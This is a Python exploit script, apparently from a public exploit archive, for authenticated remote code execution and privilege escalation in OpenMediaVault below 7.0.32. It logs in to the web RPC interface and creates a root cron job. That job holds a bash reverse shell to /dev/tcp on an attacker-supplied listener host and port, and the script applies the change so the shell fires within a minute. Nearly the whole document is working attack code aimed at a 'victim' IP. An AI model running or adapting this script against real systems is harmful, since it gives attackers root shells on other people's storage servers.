@@ -1,0 +1,201 @@
+id: 39602
+date: 05/10/2024
+title: Openmediavault Remote Code Execution / Local Privilege Escalation Exploit
+author: Mert BENADAM
+cves: 
+
+# Exploit Title: Openmediavault < 7.0.32 Authenticated RCE & Local Privilege Escalation
+# Exploit Author: Mert BENADAM
+# Vendor Homepage: https://www.openmediavault.org/
+# Software Link: https://sourceforge.net/projects/openmediavault/
+# Version: < 7.0.32
+# Tested on: OMV 7.0.32 & 6.5 @Virtual Machine
+# Description: OpenMediaVault is the next generation network attached storage (NAS) solution based on Debian Linux.
+
+
+# Special Thx: k3yZ :)
+"""
+PoC:
+This vulnerability occurs when users in the web-admin group enter commands on the crontab by selecting the root shell.
+As a result of exploiting the vulnerability,authenticated web-admin users can run commands with root privileges and receive reverse shell connections.
+It can also be used in privilege escalation attacks on local systems.
+"""
+
+import argparse
+import requests
+import json
+
+def login(ip_address, username, password, lhost, lport):
+    try:
+        login_data = {
+            "service": "Session",
+            "method": "login",
+            "params": {
+                "username": username,
+                "password": password
+            },
+            "options": None
+        }
+
+        url = f"http://{ip_address}/rpc.php"
+
+        response = requests.post(url, json=login_data)
+
+        if response.status_code == 200:
+            print("Login Success , Checking User Privilages...")
+            post_check(ip_address, response.cookies, lhost , lport)
+        else:
+            print("login Failed, Probably Wrong User Credentials...")
+
+            print("Reason:")
+            print(response.json())
+
+    except requests.exceptions.ConnectionError:
+        print("Connection Error: Could Not Connect To The Server...")
+    except Exception as e:
+        print("Unexpected Error:", e)
+
+def post_check(ip_address, cookies, lhost, lport):
+    try:
+        post_data = {
+            "service": "Cron",
+            "method": "getList",
+            "params": {
+                "type": ["userdefined"],
+                "start": 0,
+                "limit": -1
+            },
+            "options": None
+        }
+
+        url = f"http://{ip_address}/rpc.php"
+        response = requests.post(url, json=post_data, cookies=cookies)
+
+
+
+        if response.status_code == 200:
+            print("Accesing Crons...OK")
+            send_post(ip_address, cookies, lhost , lport)
+
+
+        elif response.status_code == 403:
+            print("Kullanıcı yetkili değil.")
+        else:
+            print("Post Request Failure...")
+
+    except requests.exceptions.ConnectionError:
+        print("Connection Error: Could Not Connect To The Server...")
+    except Exception as e:
+        print("Beklenmeyen bir hata oluştu:", e)
+
+def send_post(ip_address, cookies, lhost , lport):
+    try:
+
+
+        post_data = {
+            "service": "Cron",
+            "method": "set",
+            "params": {
+                "uuid": "fa4b1c66-ef79-11e5-87a0-0002b3a176b4",  # UUID
+                "enable": True,
+                "execution": "exactly",
+                "minute": ["*"],
+                "everynminute": False,
+                "hour": ["*"],
+                "everynhour": False,
+                "dayofmonth": ["*"],
+                "everyndayofmonth": False,
+                "month": ["*"],
+                "dayofweek": ["*"],
+                "username": "root",
+                "command": f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport} <&1'",  # Command From User
+                "sendemail": False,
+                "comment": "",
+                "type": "userdefined"
+            },
+            "options": None
+        }
+
+        url = f"http://{ip_address}/rpc.php"
+        response = requests.post(url, json=post_data, cookies=cookies)
+
+        if response.status_code == 200:
+            print("Payload Sent... OK,")
+            update(ip_address, cookies)
+        elif response.status_code == 403:
+            print("User Not Authrorized.")
+        else:
+            print("Something Wrong.CHECK your version...")
+
+
+    except requests.exceptions.ConnectionError:
+        print("Connection Error: Could Not Connect To The Server...")
+    except Exception as e:
+        print("Unexpected Error:", e)
+
+
+def update(ip_address, cookies):
+    try:
+
+        post_data = {
+            "service": "Config",
+            "method": "applyChangesBg",
+            "params": {
+                "modules": [],
+                "force": False
+            },
+            "options": None
+        }
+
+
+        url = f"http://{ip_address}/rpc.php"
+
+        response = requests.post(url, json=post_data, cookies=cookies)
+
+        if response.status_code == 200:
+            print("Updating crontabs...")
+            print("Successfully Exploited...")
+            print("Exploited Shell Will Be Triggered In 1 Minute, Check Your Listener...")
+            print("Warning: Make sure You Open a listener And Enter Correct IP-PORT Information...")
+        elif response.status_code == 403:
+            print("User Not Authrorized.")
+        else:
+            print("Someting Wrong. Check version...")
+
+    except requests.exceptions.ConnectionError:
+        print("Connection Error: Could Not Connect To The Server...")
+    except Exception as e:
+        print("Unexpected Error:", e)
+
+
+def main():
+    font="""
+
+███╗   ██╗ ██████╗ ███╗   ███╗███████╗██████╗  ██████╗██╗   ██╗ ██████╗  ██████╗
+████╗  ██║██╔═══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝██╔═████╗██╔═████╗
+██╔██╗ ██║██║   ██║██╔████╔██║█████╗  ██████╔╝██║      ╚████╔╝ ██║██╔██║██║██╔██║
+██║╚██╗██║██║   ██║██║╚██╔╝██║██╔══╝  ██╔══██╗██║       ╚██╔╝  ████╔╝██║████╔╝██║
+██║ ╚████║╚██████╔╝██║ ╚═╝ ██║███████╗██║  ██║╚██████╗   ██║   ╚██████╔╝╚██████╔╝
+╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝    ╚═════╝  ╚═════╝
+
+    """
+    parser = argparse.ArgumentParser(description="OpenMediaVault 7.0.32 > 6.5.0 RCE And Local Privilage Escalation")
+    parser.add_argument("-U", "--ip", type=str, help="Victim Ip Adress", required=False)
+    parser.add_argument("-u", "--username", type=str, help="Username For Web Admin", required=False)
+    parser.add_argument("-p", "--password", type=str, help="Password For Web Admin", required=False)
+    parser.add_argument("-L", "--lhost", type=str, help="Listener IP Adress For Reverse Shell", required=False)
+    parser.add_argument("-P", "--lport", type=str, help="Listener Port For Reverse Shell", required=False)
+
+    args = parser.parse_args()
+
+    if args.ip and args.username and args.password and args.lhost and args.lport:
+        print(font)
+        login(args.ip, args.username, args.password, args.lhost , args.lport)
+    else:
+        print(font)
+        parser.print_help()
+
+if __name__ == "__main__":
+    main()
+
+#  0day.today [2024-05-10]  #
